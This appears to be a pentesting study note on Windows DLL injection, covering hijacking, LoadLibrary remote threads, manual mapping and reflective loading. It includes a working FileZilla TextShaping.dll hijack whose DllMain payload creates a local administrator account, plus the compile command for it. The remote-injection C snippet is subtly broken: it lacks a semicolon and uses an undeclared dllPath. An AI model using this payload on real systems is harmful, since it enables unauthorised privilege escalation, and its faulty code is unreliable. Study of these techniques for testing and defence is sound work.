---
title: DLL Injection
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# DLL Injection

[_Dynamic Link Libraries_](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) (DLL) provide functionality to programs or the Windows operating system. DLLs contain code or resources, such as icon files, for other executable files or objects to use. These libraries provide a way for developers to use and integrate already existing functionality without reinventing the wheel. Windows uses DLLs to store functionality needed by several components. Otherwise, each component would need the functionality in their own source code resulting in a huge resource waste. On Unix systems, these files are called [_Shared Objects_](https://docs.oracle.com/cd/E19120-01/open.solaris/819-0690/6n33n7f8u/index.html).

DLL injection is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. 

There are several different methods for actually executing a DLL injection.

## DLL Hijacking

`DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

The default DLL search order used by the system depends on whether `Safe DLL Search Mode` is activated.

When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.

1. Press `Windows key + R` to open the Run dialog box.
2. Type in `Regedit` and press `Enter`. This will open the Registry Editor.
3. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
4. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
5. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.
6. Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.

With this mode enabled, applications search for necessary DLL files in the following sequence:

1. The directory from which the application is loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

1. The directory from which the application is loaded.
2. The current directory.
3. The system directory.
4. The 16-bit system directory.
5. The Windows directory
6. The directories that are listed in the PATH environment variable

DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:

1. `Process Explorer`: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
2. `PE Explorer`: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers.


Another way would be....

### DLL path with status NAME NOT FOUND

Let's say there is a binary `main.exe` running as SYSTEM admin, and we set  the procmon filter to focus on entries whose path ends in .dll and has a status of NAME NOT FOUND.

If the dll with NAME NOT found is located at a folder where we have write permissions, then we can load our malicious dll within that path.


To exploit this situation, we can try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started.

### An example

Find Installed programs:

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Output:

```text
FileZilla 3.63.1
[AND OTHERS]
```

According to [online resources this application seems to contain a 
DLL hijacking vulnerability](https://www.exploit-db.com/exploits/51267): When the application is started it will attempt to load the TextShaping.dll file from the installation directory. If we're able to place a malicious DLL here then whenever someone attempts to run the FileZilla FTP Client the DLL should be loaded with the permissions of the user.

Determine if we are able to write files to the FileZilla directory.

```
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```

We can use [_Process Monitor_](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to display real-time information about any process, thread, file system, or registry related activities. However for this we need Local Admin privileges. So we will copy the binary to a machine where we have them and run it.

In Process Monitor filter out by `Process Name` and value `filezilla.exe`. As we know the affected dll we add to our filter `Path` contains `TextShaping.dll`. And now we can see that first attempts to load the DLL from the application path **"C:\FileZilla\FileZilla FTP Client\"** where it fails with the _NAME NOT FOUND_ result indicating that the DLL is not present there at all. This is followed by two more _CreateFile_ operations where the DLL is loaded from System32 which seem to succeed.

![[dll.png]]

Before we create a DLL, let's briefly review how attaching a DLL works and how it may lead us to code execution. Each DLL can have an optional _entry point function_ named _DllMain_, which is executed when processes or threads attach the DLL. This function generally contains four cases named _DLL_PROCESS_ATTACH_, _DLL_THREAD_ATTACH_, _DLL_THREAD_DETACH_, _DLL_PROCESS_DETACH_. These cases handle situations when the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. If a DLL doesn't have a _DllMain_ entry point function, it only provides resources.

The following listing shows us a [code example](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point) from Microsoft, outlining a basic DLL in [_C++_](https://en.wikipedia.org/wiki/C%2B%2B) containing these four cases. The DLL code contains the entry point function _DllMain_ and the previously mentioned cases in a _switch_ statement. Depending on the value of _ul_reason_for_call_ one of these cases gets executed. As of now, all cases only use a _break_ statement.

```c++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```


The provided comments from Microsoft state that _DLL_PROCESS_ATTACH_ is used when a process is loading the DLL. Since the target binary process in our example tries to load the DLL, this is the case we need to add our code to.

Let's reuse the C code from the previous section by adding the _include_ statement as well as the system function calls to the C++ DLL code. Additionally, we need to use an _include_ statement for the header file **windows.h**, since we use Windows specific data types such as _BOOL_. The final code is shown in the following listing.

```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Now, let's cross-compile the code with mingw.

```bash
x86_64-w64-mingw32-gcc vulnerableDll.cpp --shared -o TextShaping.dll
```

Once the DLL is compiled, we can transfer it to the target. TextShaping.dll is now located in the `C:\FileZilla\FileZilla FTP Client\` directory, which is the first path in the DLL search order.

In order for the DLL hijacking to trigger the FileZilla FTP Client needs to be started, however, it is important to keep in mind that the privileges the DLL will run with depend on the privileges used to start the application. With this in mind, we don't have to start the application on our own. We have the option of waiting for someone with higher privileges to run the application and trigger the loading of our malicious DLL.


## LoadLibrary

The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.

This example shows how `LoadLibrary` can be used to load a DLL into the current process legitimately:

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```


This other example illustrates the use of LoadLibrary for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at LoadLibrary and directs towards the DLL path: 

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll. Or... Give me the memory address of the `LoadLibraryA` function inside kernel32.dll that's already loaded into my process
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

>`LoadLibraryA` is a Windows API function from **kernel32.dll** that **loads a DLL (Dynamic Link Library) into the memory of a process**. It takes a path to a `.dll` file as a string argument and returns a handle to the loaded module. The `"A"` stands for ANSI version — there's also `LoadLibraryW` for wide-character (Unicode) strings. It comes from **`kernel32.dll`**, which is a core Windows system library that provides essential functions like memory management, threading, file I/O, and -in this case- DLL loading.

## Manual Mapping 

`Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the `LoadLibrary` function, whose usage is monitored by security and anti-cheat systems.

A simplified outline of the process can be represented as follows:

1. Load the DLL as raw data into the injecting process.
2. Map the DLL sections into the targeted process.
3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.


## Reflective DLL Injection

Reflective DLL injection is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.

Source: [https://github.com/stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)

The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.

1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.
2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.
3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
5. The library's headers and sections are loaded into their new memory locations.
6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.
8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.
9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate.


